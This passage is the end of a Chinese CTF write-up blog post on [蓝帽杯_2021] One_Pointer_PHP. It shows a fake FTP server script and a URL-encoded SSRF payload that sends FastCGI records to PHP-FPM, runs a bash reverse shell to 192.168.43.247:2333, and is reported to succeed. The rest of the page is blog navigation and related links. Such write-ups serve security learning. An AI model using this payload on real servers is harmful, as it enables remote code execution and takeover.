password.\n'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token comment">#User name okay, need password.</span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token comment">#Client send anonymous password.</span></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token comment">#PASS anonymous</span></pre></td></tr><tr><td data-num="14"></td><td><pre>conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'230 Login successful.\n'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token comment">#User logged in, proceed. Logged out if appropriate.</span></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token comment">#TYPE I</span></pre></td></tr><tr><td data-num="17"></td><td><pre>conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'200 Switching to Binary mode.\n'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token comment">#Size /</span></pre></td></tr><tr><td data-num="19"></td><td><pre>conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'550 Could not get the file size.\n'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token comment">#EPSV (1)</span></pre></td></tr><tr><td data-num="21"></td><td><pre>conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'150 ok\n'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token comment">#PASV</span></pre></td></tr><tr><td data-num="23"></td><td><pre>conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'227 Entering Extended Passive Mode (127,0,0,1,0,9001)\n'</span><span class="token punctuation">)</span> <span class="token comment">#STOR / (2)</span></pre></td></tr><tr><td data-num="24"></td><td><pre>conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'150 Permission denied.\n'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="25"></td><td><pre><span class="token comment">#QUIT</span></pre></td></tr><tr><td data-num="26"></td><td><pre>conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'221 Goodbye.\n'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="27"></td><td><pre>conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p>并在 vps 上开启一个 nc 监听，用于接收反弹的 shell：</p>
<p><img data-src="https://shs3.b.qianxin.com/attack_forum/2021/12/attach-a693b1b41f81ece00e9c1c6cc9f2aa800194ef27.png" alt="image-20210502111019876" /></p>
<p>最后构造 url 发送 payload 即可：</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token operator">/</span>?<span class="token builtin">file</span><span class="token operator">=</span>ftp<span class="token punctuation">:</span><span class="token operator">//</span>aaa@<span class="token number">192.168</span><span class="token number">.43</span><span class="token number">.247</span><span class="token punctuation">:</span><span class="token number">23</span><span class="token operator">/</span><span class="token number">123</span><span class="token operator">&amp;</span>data<span class="token operator">=</span><span class="token operator">%</span><span class="token number">01</span><span class="token operator">%</span><span class="token number">01</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">01</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">08</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">01</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">01</span><span class="token operator">%</span><span class="token number">04</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">01</span><span class="token operator">%</span><span class="token number">01</span><span class="token operator">%</span><span class="token number">05</span><span class="token operator">%</span><span class="token number">05</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span>0F<span class="token operator">%</span>10SERVER_SOFTWAREgo<span class="token operator">%</span><span class="token number">20</span><span class="token operator">/</span><span class="token operator">%</span>20fcgiclient<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span>0B<span class="token operator">%</span>09REMOTE_ADDR127<span class="token punctuation">.</span><span class="token number">0.0</span><span class="token number">.1</span><span class="token operator">%</span>0F<span class="token operator">%</span>08SERVER_PROTOCOLHTTP<span class="token operator">/</span><span class="token number">1.1</span><span class="token operator">%</span>0E<span class="token operator">%</span>03CONTENT_LENGTH106<span class="token operator">%</span>0E<span class="token operator">%</span>04REQUEST_METHODPOST<span class="token operator">%</span>09KPHP_VALUEallow_url_include<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span>3D<span class="token operator">%</span>20On<span class="token operator">%</span>0Adisable_functions<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span>3D<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span>0Aauto_prepend_file<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span>3D<span class="token operator">%</span>20php<span class="token operator">%</span>3A<span class="token operator">//</span><span class="token builtin">input</span><span class="token operator">%</span>0F<span class="token operator">%</span>17SCRIPT_FILENAME<span class="token operator">/</span>var<span class="token operator">/</span>www<span class="token operator">/</span>html<span class="token operator">/</span>index<span class="token punctuation">.</span>php<span class="token operator">%</span>0D<span class="token operator">%</span>01DOCUMENT_ROOT<span class="token operator">/</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">01</span><span class="token operator">%</span><span class="token number">04</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">01</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">01</span><span class="token operator">%</span><span class="token number">05</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">01</span><span class="token operator">%</span><span class="token number">00j</span><span class="token operator">%</span><span class="token number">04</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span>3C<span class="token operator">%</span>3Fphp<span class="token operator">%</span>20system<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span>27bash<span class="token operator">%</span><span class="token number">20</span><span class="token operator">-</span>c<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span>22bash<span class="token operator">%</span><span class="token number">20</span><span class="token operator">-</span>i<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span>3E<span class="token operator">%</span><span class="token number">26</span><span class="token operator">%</span><span class="token number">20</span><span class="token operator">/</span>dev<span class="token operator">/</span>tcp<span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.43</span><span class="token number">.247</span><span class="token operator">/</span><span class="token number">2333</span><span class="token operator">%</span><span class="token number">200</span><span class="token operator">%</span>3E<span class="token operator">%</span><span class="token number">261</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span>3Bdie<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span><span class="token number">27</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>Made<span class="token operator">-</span>by<span class="token operator">-</span>SpyD3r<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">%</span>0A<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span>3B<span class="token operator">%</span>3F<span class="token operator">%</span>3E<span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span></pre></td></tr></table></figure><p><img data-src="https://shs3.b.qianxin.com/attack_forum/2021/12/attach-656472f7a843e746735ed392f667b970184f850c.png" alt="image-20210502111056517" /></p>
<p>如下图所示，命令执行成功，并成功反弹 Shell：</p>
<p><img data-src="https://shs3.b.qianxin.com/attack_forum/2021/12/attach-6b3de99025fc49d042ab9e22ac29923216ed792c.png" alt="image-20210502111135087" /></p>
<p>（搞个小转载）参考链接：<span class="exturl" data-url="aHR0cHM6Ly9mb3J1bS5idXRpYW4ubmV0L3NoYXJlLzQ3NQ==">奇安信攻防社区 - 浅入深出 Fastcgi 协议分析与 PHP-FPM 攻击方法</span>写的真的是太酷啦</p>

      <div class="tags">
          <a href="/tags/buuctf/" rel="tag"><i class="ic i-tag"></i> buuctf</a>
          <a href="/tags/fastcgi-php-FPM/" rel="tag"><i class="ic i-tag"></i> fastcgi-php-FPM</a>
          <a href="/tags/disable-function/" rel="tag"><i class="ic i-tag"></i> disable_function</a>
      </div>
  </div>

   <footer>

    <div class="meta">
  <span class="item">
    <span class="icon">
      <i class="ic i-calendar-check"></i>
    </span>
    <span class="text">Edited on</span>
    <time title="Modified: 2024-11-08 21:42:33" itemprop="dateModified" datetime="2024-11-08T21:42:33+08:00">2024-11-08</time>
  </span>
</div>

      
<div class="reward">
  <button><i class="ic i-heartbeat"></i> Donate</button>
  <p>Give me a cup of [coffee]~(￣▽￣)~*</p>
  <div id="qr">
      
      <div>
        <img data-src="/images/wechatpay.png" alt="odiws WeChat Pay">
        <p>WeChat Pay</p>
      </div>
      
      <div>
        <img data-src="/images/alipay.png" alt="odiws Alipay">
        <p>Alipay</p>
      </div>
      
      <div>
        <img data-src="/images/paypal.png" alt="odiws PayPal">
        <p>PayPal</p>
      </div>
  </div>
</div>

      

<div id="copyright">
<ul>
  <li class="author">
    <strong>Post author:  </strong>odiws <i class="ic i-at"><em>@</em></i>Hexo
  </li>
  <li class="link">
    <strong>Post link: </strong>
    <a href="http://odiws.github.io/2024/11/07/%E8%93%9D%E5%B8%BD%E6%9D%AF-2021-One-Pointer-PHP/" title="[蓝帽杯_2021]One_Pointer_PHP">http://odiws.github.io/2024/11/07/蓝帽杯-2021-One-Pointer-PHP/</a>
  </li>
  <li class="license">
    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> unless stating additionally.
  </li>
</ul>
</div>

  </footer>

</article>

  </div>
  

<div class="post-nav">
    <div class="item left">
      

  <a href="/2024/11/05/WMCTF2020-Web-Check-in-2-0/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;www.loliapi.com&#x2F;acg&#x2F;?454514" title="[WMCTF2020]Web-Check-in-2.0">
  <span class="type">Previous Post</span>
  <span class="category"><i class="ic i-flag"></i> 刷题笔记</span>
  <h3>[WMCTF2020]Web-Check-in-2.0</h3>
  </a>

    </div>
    <div class="item right">
      

  <a href="/2024/11/08/HarekazeCTF2019-Sqlite-Voting/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;www.loliapi.com&#x2F;acg&#x2F;?561003" title="[HarekazeCTF2019]Sqlite-Voting">
  <span class="type">Next Post</span>
  <span class="category"><i class="ic i-flag"></i> 刷题笔记</span>
  <h3>[HarekazeCTF2019]Sqlite-Voting</h3>
  </a>

    </div>
</div>

  
  <div class="wrap" id="comments"></div>


        </div>
        <div id="sidebar">
          

<div class="inner">

  <div class="panels">
    <div class="inner">
      <div class="contents panel pjax" data-title="Contents">
          <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%93%9D%E5%B8%BD%E6%9D%AF_2021one_pointer_php"><span class="toc-number">1.</span> <span class="toc-text"> [蓝帽杯_2021] One_Pointer_PHP</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#php-%E6%95%B0%E7%BB%84%E6%BA%A2%E5%87%BA%E7%BB%95%E8%BF%87%E9%99%90%E5%88%B6"><span class="toc-number">1.0.1.</span> <span class="toc-text"> PHP 数组溢出绕过限制：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%BB%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6"><span class="toc-number">1.0.2.</span> <span class="toc-text"> 读配置文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%95%E8%BF%87open_basedir%E8%AF%BB%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6"><span class="toc-number">1.0.3.</span> <span class="toc-text"> 绕过 open_basedir 读敏感文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ftp-passive-mode%E5%8F%91bin%E7%BB%99php-fpm"><span class="toc-number">1.0.4.</span> <span class="toc-text"> FTP Passive Mode 发 bin 给 php-fpm</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#suid%E6%8F%90%E6%9D%83"><span class="toc-number">1.0.5.</span> <span class="toc-text"> SUID 提权</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cgi"><span class="toc-number">2.</span> <span class="toc-text"> CGI</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fastcgi"><span class="toc-number">3.</span> <span class="toc-text"> FastCGI</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%8F%E8%A7%88%E5%99%A8%E5%A4%84%E7%90%86%E9%9D%99%E6%80%81%E5%8A%A8%E6%80%81%E7%BD%91%E9%A1%B5%E8%BF%87%E7%A8%8B"><span class="toc-number">4.</span> <span class="toc-text"> 浏览器处理静态 &#x2F; 动态网页过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%8F%E8%A7%88%E5%99%A8%E8%AE%BF%E9%97%AE%E9%9D%99%E6%80%81%E7%BD%91%E9%A1%B5%E8%BF%87%E7%A8%8B"><span class="toc-number">4.1.</span> <span class="toc-text"> 浏览器访问静态网页过程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%8F%E8%A7%88%E5%99%A8%E8%AE%BF%E9%97%AE%E5%8A%A8%E6%80%81%E7%BD%91%E9%A1%B5%E8%BF%87%E7%A8%8B"><span class="toc-number">4.2.</span> <span class="toc-text"> 浏览器访问动态网页过程</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fastcgi-%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90"><span class="toc-number">5.</span> <span class="toc-text"> Fastcgi 协议分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#fastcgi-record"><span class="toc-number">5.1.</span> <span class="toc-text"> Fastcgi Record</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fastcgi-type"><span class="toc-number">5.2.</span> <span class="toc-text"> Fastcgi Type</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php-fpm"><span class="toc-number">6.</span> <span class="toc-text"> PHP-FPM</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php-fpm-%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="toc-number">7.</span> <span class="toc-text"> PHP-FPM 任意代码执行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php-fpm-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E"><span class="toc-number">8.</span> <span class="toc-text"> PHP-FPM 未授权访问漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">8.1.</span> <span class="toc-text"> 环境搭建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%85%8D%E7%BD%AE-php-fpm"><span class="toc-number">8.2.</span> <span class="toc-text"> 配置 PHP-FPM</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%AF%E5%8A%A8%E7%8E%AF%E5%A2%83"><span class="toc-number">8.3.</span> <span class="toc-text"> 启动环境</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-fcgi_expgo-%E6%94%BB%E5%87%BB"><span class="toc-number">8.4.</span> <span class="toc-text"> 利用 fcgi_exp.go 攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-phith0n-%E5%A4%A7%E7%A5%9E%E7%9A%84-fpmpy"><span class="toc-number">8.5.</span> <span class="toc-text"> 利用 phith0n 大神的 fpm.py</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ssrf-%E4%B8%AD%E5%AF%B9-fpmfastcgi-%E7%9A%84%E6%94%BB%E5%87%BB"><span class="toc-number">9.</span> <span class="toc-text"> SSRF 中对 FPM&#x2F;FastCGI 的攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-fcgi_exp-%E6%94%BB%E5%87%BB"><span class="toc-number">9.1.</span> <span class="toc-text"> 利用 fcgi_exp 攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-gopherus-%E6%94%BB%E5%87%BB"><span class="toc-number">9.2.</span> <span class="toc-text"> 利用 Gopherus 攻击</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ftp-ssrf-%E6%94%BB%E5%87%BB-fpmfastcgi"><span class="toc-number">10.</span> <span class="toc-text"> FTP - SSRF 攻击 FPM&#x2F;FastCGI</span></a></li></ol>
      </div>
      <div class="related panel pjax" data-title="Related">
        <ul>
          <li><a href="/2024/04/28/3-txt/" rel="bookmark" title="buuctf4月27日">buuctf4月27日</a></li><li><a href="/2024/06/06/%5BRootersCTF2019%5DI_3_Flask/" rel="bookmark" title="'[RootersCTF2019]I_<3_Flask'">'[RootersCTF2019]I_<3_Flask'</a></li><li><a href="/2024/06/06/%5BNCTF2019%5DSQLi/" rel="bookmark" title="'[NCTF2019]SQLi'">'[NCTF2019]SQLi'</a></li><li><a href="/2024/06/07/%5BNPUCTF2020%5Dezinclude/" rel="bookmark" title="'[NPUCTF2020]ezinclude'">'[NPUCTF2020]ezinclude'</a></li><li><a href="/2024/06/11/2019-EasyWeb/" rel="bookmark" title="[SUCTF 2019]EasyWeb">[SUCTF 2019]EasyWeb</a></li><li><a href="/2024/07/25/2019-Web-Unagi/" rel="bookmark" title="[CSAWQual2019]Web_Unagi">[CSAWQual2019]Web_Unagi</a></li><li><a href="/2024/07/26/1/" rel="bookmark" title="easybypass">easybypass</a></li><li><a href="/2024/07/28/2020-Greatphp/" rel="bookmark" title="[极客大挑战2020]Greatphp">[极客大挑战2020]Greatphp</a></li><li><a href="/2024/07/28/2019-SVGMagic/" rel="bookmark" title="[BSidesCF2019]SVGMagic">[BSidesCF2019]SVGMagic</a></li><li><a href="/2024/07/29/ISITDTU2019-EasyPHP/" rel="bookmark" title="[羊城杯2020]easyphp">[羊城杯2020]easyphp</a></li><li><a href="/2024/08/15/%E5%AE%89%E6%B4%B5%E6%9D%AF2019-%E4%B8%8D%E6%98%AF%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="bookmark" title="[安洵杯2019]不是文件上传">[安洵杯2019]不是文件上传</a></li><li><a href="/2024/09/23/%E5%AE%89%E6%B4%B5%E6%9D%AF2019-iamthinking/" rel="bookmark" title="[安洵杯2019]iamthinking">[安洵杯2019]iamthinking</a></li><li><a href="/2024/09/24/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020-Easyphp2/" rel="bookmark" title="[羊城杯2020]Easyphp2">[羊城杯2020]Easyphp2</a></li><li><a href="/2024/09/24/virink-2019-files-share/" rel="bookmark" title="virink_2019_files_share">virink_2019_files_share</a></li><li><a href="/2024/09/24/NESTCTF2019-LoveMath2/" rel="bookmark" title="[NESTCTF2019]LoveMath2">[NESTCTF2019]LoveMath2</a></li><li><a href="/2024/09/24/RootersCTF2019-ImgXweb/" rel="bookmark" title="[RootersCTF2019]ImgXweb">[RootersCTF2019]ImgXweb</a></li><li><a href="/2024/09/25/DDCTF2019-homebreweventloop/" rel="bookmark" title="[DDCTF2019]homebreweventloop">[DDCTF2019]homebreweventloop</a></li><li><a href="/2024/09/26/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020-Blackcat/" rel="bookmark" title="[羊城杯2020]Blackcat">[羊城杯2020]Blackcat</a></li><li><a href="/2024/09/27/watevrCTF-2019-PickleStore/" rel="bookmark" title="[watevrCTF-2019]PickleStore">[watevrCTF-2019]PickleStore</a></li><li><a href="/2024/10/11/GYCTF2020-NodeGame-nodejs/" rel="bookmark" title="[GYCTF2020]NodeGame-nodejs">[GYCTF2020]NodeGame-nodejs</a></li><li><a href="/2024/10/15/CSAWQual2016-i-got-id/" rel="bookmark" title="[CSAWQual2016]i_got_id">[CSAWQual2016]i_got_id</a></li><li><a href="/2024/10/15/HarekazeCTF2019-EasyNotes-1/" rel="bookmark" title="[HarekazeCTF2019]EasyNotes">[HarekazeCTF2019]EasyNotes</a></li><li><a href="/2024/10/15/SWPU2019-Web3/" rel="bookmark" title="[SWPU2019]Web3">[SWPU2019]Web3</a></li><li><a href="/2024/10/15/FBCTF2019-Event/" rel="bookmark" title="[FBCTF2019]Event">[FBCTF2019]Event</a></li><li><a href="/2024/10/17/RCTF2019-Nextphp/" rel="bookmark" title="[RCTF2019]Nextphp">[RCTF2019]Nextphp</a></li><li><a href="/2024/10/17/BSidesCF-2019-PickTacToe/" rel="bookmark" title="[BSidesCF2019]Pick Tac Toe">[BSidesCF2019]Pick Tac Toe</a></li><li><a href="/2024/10/17/HITCON2016-Leaking/" rel="bookmark" title="[HITCON2016]Leaking">[HITCON2016]Leaking</a></li><li><a href="/2024/10/20/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84-notes/" rel="bookmark" title="[网鼎杯2020青龙组]notes">[网鼎杯2020青龙组]notes</a></li><li><a href="/2024/10/21/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020-EasySer/" rel="bookmark" title="[羊城杯2020]EasySer">[羊城杯2020]EasySer</a></li><li><a href="/2024/10/23/NewStarCTF2023%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-include0%E3%80%820/" rel="bookmark" title="[NewStarCTF2023公开赛道]include0。0">[NewStarCTF2023公开赛道]include0。0</a></li><li><a href="/2024/11/03/CISCN2021Quals-upload/" rel="bookmark" title="[CISCN2021Quals]upload">[CISCN2021Quals]upload</a></li><li><a href="/2024/11/04/2021%E7%A5%A5%E4%BA%91%E6%9D%AF-PackageManager2021/" rel="bookmark" title="[2021祥云杯]PackageManager2021">[2021祥云杯]PackageManager2021</a></li><li><a href="/2024/11/04/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020-Roamphp2-Myblog/" rel="bookmark" title="[极客大挑战2020]Roamphp2-Myblog">[极客大挑战2020]Roamphp2-Myblog</a></li><li><a href="/2024/11/05/HXBCT-2021-easywill/" rel="bookmark" title="[HXBCT_2021]easywill">[HXBCT_2021]easywill</a></li><li><a href="/2024/11/05/HFCTF2021Quals-Unsetme/" rel="bookmark" title="[HFCTF2021Quals]Unsetme">[HFCTF2021Quals]Unsetme</a></li><li><a href="/2024/11/05/WMCTF2020-Web-Check-in-2-0/" rel="bookmark" title="[WMCTF2020]Web-Check-in-2.0">[WMCTF2020]Web-Check-in-2.0</a></li><li class="active"><a href="/2024/11/07/%E8%93%9D%E5%B8%BD%E6%9D%AF-2021-One-Pointer-PHP/" rel="bookmark" title="[蓝帽杯_2021]One_Pointer_PHP">[蓝帽杯_2021]One_Pointer_PHP</a></li><li><a href="/2024/11/08/HarekazeCTF2019-Sqlite-Voting/" rel="bookmark" title="[HarekazeCTF2019]Sqlite-Voting">[HarekazeCTF2019]Sqlite-Voting</a></li><li><a href="/2024/11/08/JMCTF2021-UploadHub/" rel="bookmark" title="[JMCTF2021]UploadHub">[JMCTF2021]UploadHub</a></li><li><a href="/2024/11/10/NewStarCTF-2023-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-ez-sql/" rel="bookmark" title="[NewStarCTF-2023-公开赛道]ez_sql">[NewStarCTF-2023-公开赛道]ez_sql</a></li><li><a href="/2024/11/14/NPUCTF2020-webdog/" rel="bookmark" title="NPUCTF2020webdog">NPUCTF2020webdog</a></li><li><a href="/2024/11/15/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E5%8D%8A%E5%86%B3%E8%B5%9B-faka/" rel="bookmark" title="[网鼎杯2020半决赛]faka">[网鼎杯2020半决赛]faka</a></li><li><a href="/2024/11/17/HCTF2018-Hideandseek/" rel="bookmark" title="HCTF2018Hideandseek">HCTF2018Hideandseek</a></li><li><a href="/2024/11/18/FBCTF2019-Products-Manager/" rel="bookmark" title="[FBCTF2019]Products-Manager">[FBCTF2019]Products-Manager</a></li><li><a href="/2024/11/18/BSidesCF-2019-Mixer/" rel="bookmark" title="[BSidesCF-2019]Mixer">[BSidesCF-2019]Mixer</a></li><li><a href="/2024/11/19/BSidesCF-2020-Cards/" rel="bookmark" title="[BSidesCF-2020]Cards">[BSidesCF-2020]Cards</a></li><li><a href="/2024/11/19/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2020-Roamphp4-Rceme/" rel="bookmark" title="[极客大挑战-2020]Roamphp4-Rceme">[极客大挑战-2020]Roamphp4-Rceme</a></li><li><a href="/2024/11/20/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E5%8D%8A%E5%86%B3%E8%B5%9B-BabyJS/" rel="bookmark" title="[网鼎杯-2020-半决赛]BabyJS">[网鼎杯-2020-半决赛]BabyJS</a></li><li><a href="/2024/11/22/HMGCTF2022-Smarty-Calculator/" rel="bookmark" title="[HMGCTF2022]Smarty-Calculator">[HMGCTF2022]Smarty-Calculator</a></li><li><a href="/2024/11/29/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-EasyTP/" rel="bookmark" title="[红明谷CTF-2021]EasyTP">[红明谷CTF-2021]EasyTP</a></li><li><a href="/2024/12/01/LineCTF2022-BB/" rel="bookmark" title="[LineCTF2022]BB">[LineCTF2022]BB</a></li><li><a href="/2024/12/01/NewStarCT-2023-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-Upload-again/" rel="bookmark" title="[NewStarCT_2023_公开赛道]Upload_again!">[NewStarCT_2023_公开赛道]Upload_again!</a></li><li><a href="/2024/12/04/%E5%88%B7%E6%96%B0%E8%BF%87%E7%9A%84%E5%9B%BE%E7%89%87/" rel="bookmark" title="刷新过的图片">刷新过的图片</a></li><li><a href="/2024/12/04/MRCTF2020-Ezpop-Revenge/" rel="bookmark" title="[MRCTF2020]Ezpop_Revenge">[MRCTF2020]Ezpop_Revenge</a></li><li><a href="/2024/12/10/b01lers2020-Spac-Noodles/" rel="bookmark" title="[b01lers2020]Spac_Noodles">[b01lers2020]Spac_Noodles</a></li><li><a href="/2024/12/10/De1CTF-2019-Giftbox/" rel="bookmark" title="[De1CTF_2019]Giftbox">[De1CTF_2019]Giftbox</a></li><li><a href="/2025/01/26/NewStarCTF2023%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-EasyLogin/" rel="bookmark" title="[NewStarCTF2023公开赛道]EasyLogin">[NewStarCTF2023公开赛道]EasyLogin</a></li><li><a href="/2025/01/26/NewStarCTF2023%E6%96%B0%E7%94%9F%E8%B5%9B-BabySSTI-Three/" rel="bookmark" title="NewStarCTF2023新生赛_BabySSTI_Three">NewStarCTF2023新生赛_BabySSTI_Three</a></li><li><a href="/2025/02/09/%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-UnserializeOne/" rel="bookmark" title="公开赛赛道]UnserializeOne">公开赛赛道]UnserializeOne</a></li><li><a href="/2025/02/09/NewStarCTF%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-BabySSTI-Two/" rel="bookmark" title="[NewStarCTF公开赛赛道]BabySSTI_Two">[NewStarCTF公开赛赛道]BabySSTI_Two</a></li><li><a href="/2025/02/09/BSidesCF2019-Sequel/" rel="bookmark" title="[BSidesCF2019]Sequel">[BSidesCF2019]Sequel</a></li><li><a href="/2025/02/23/NewStarCTF-2023-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93Include/" rel="bookmark" title="NewStarCTF_2023_公开赛道Include">NewStarCTF_2023_公开赛道Include</a></li><li><a href="/2025/02/23/HFCTF-2021-Final-hatenum/" rel="bookmark" title="[HFCTF_2021_Final]hatenum">[HFCTF_2021_Final]hatenum</a></li><li><a href="/2025/02/23/Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B-SimpleRCE/" rel="bookmark" title="[Dest0g3_520迎新赛]SimpleRCE">[Dest0g3_520迎新赛]SimpleRCE</a></li><li><a href="/2025/02/24/SWPUCTF-2016-Web7/" rel="bookmark" title="[SWPUCTF_2016]Web7">[SWPUCTF_2016]Web7</a></li><li><a href="/2025/02/26/HMGCTF2022-Fan-Website/" rel="bookmark" title="[HMGCTF2022]Fan_Website">[HMGCTF2022]Fan_Website</a></li><li><a href="/2025/03/02/PyCalX-1/" rel="bookmark" title="PyCalX_1">PyCalX_1</a></li><li><a href="/2025/03/11/GKCTF-2021-babycat-revenge/" rel="bookmark" 